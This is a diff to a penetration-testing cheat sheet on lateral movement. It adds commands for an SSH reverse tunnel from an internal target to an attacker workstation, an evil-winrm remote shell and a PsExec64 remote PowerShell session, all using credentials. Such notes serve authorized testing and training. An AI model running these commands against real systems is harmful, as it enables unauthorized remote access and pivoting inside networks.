@@ -1,7 +1,16 @@
 # 06 - Lateral Movement
 
 Index
+- [SSH Tunneling](#SSH-Tunneling)
 - [Windows New-PSSession](#Windows-New-PSSession)
+- [Evil-winrm](#Evil-winrm)
+
+## SSH Tunneling
+Fron INTERNAL target to ATTACKER workstation:
+``` bash
+ssh -N -R 9000 $USER@$KALI
+ssh -N -R 9000 sheliak@192.168.1.1
+```
 
 ## Windows New-PSSession
 ``` powershell
@@ -17,4 +26,10 @@ Enter-PSSession 1                                                               
 Linux tool to access a remote system via WinRM and obtain a shell.
 ``` bash
 evil-winrm -i 192.168.163.249 -u 'username' -p 'password'
+```
+
+## PsExec64
+``` powershell
+./PsExec64.exe -i \\TARGET -u $DIMAIN\$USER -p "$PASSWORD" powershell
+./PsExec64.exe -i \\192.168.1.1 -u TEST\username -p "password" powershell
 ```
